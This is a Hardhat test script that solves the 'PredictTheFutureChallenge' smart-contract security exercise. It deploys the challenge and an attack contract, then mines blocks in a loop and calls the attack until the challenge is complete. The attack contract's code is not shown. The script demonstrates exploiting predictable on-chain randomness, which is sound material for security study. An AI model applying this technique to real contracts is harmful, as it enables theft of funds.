import { expect } from 'chai';
import { ethers, network } from 'hardhat';
import { Contract } from 'ethers';

const { utils } = ethers;

describe('PredictTheFutureChallenge', function () {
  let challenge: Contract;
  let attack: Contract;

  before(async function () {
    // Deploy the challenge contract
    const ChallengeFactory = await ethers.getContractFactory('PredictTheFutureChallenge');
    challenge = await ChallengeFactory.deploy({ value: utils.parseEther('1') });
    await challenge.deployed();

    // Deploy the attack contract
    const AttackFactory = await ethers.getContractFactory('PredictTheFutureAttack');
    attack = await AttackFactory.deploy(challenge.address);
    await attack.deployed();
  });

  it('exploits the PredictTheFutureChallenge', async function () {
    // Lock in the guess using the attack contract
    await attack.lockInGuess({ value: utils.parseEther('1') });

    // We simulate the passing of blocks until the settle function can be called.
    // This mimics the asynchronous nature of blockchain interactions.
    while (!(await challenge.isComplete())) {
      try {
        // Before calling attack, we mine a new block to simulate the passage of time
        await network.provider.send('evm_mine');

        // Call the attack function, which internally calls settle
        const attackTx = await attack.attack();
        await attackTx.wait();
      } catch (err) {
        console.error(err);
      }

      // Output the current block number for logging purposes
      const blockNumber = await ethers.provider.getBlockNumber();
      console.log(`Tried block number: ${blockNumber}`);
    }

    // After the loop, we check to see if the challenge has been completed
    expect(await challenge.isComplete()).to.be.true;
  });
});
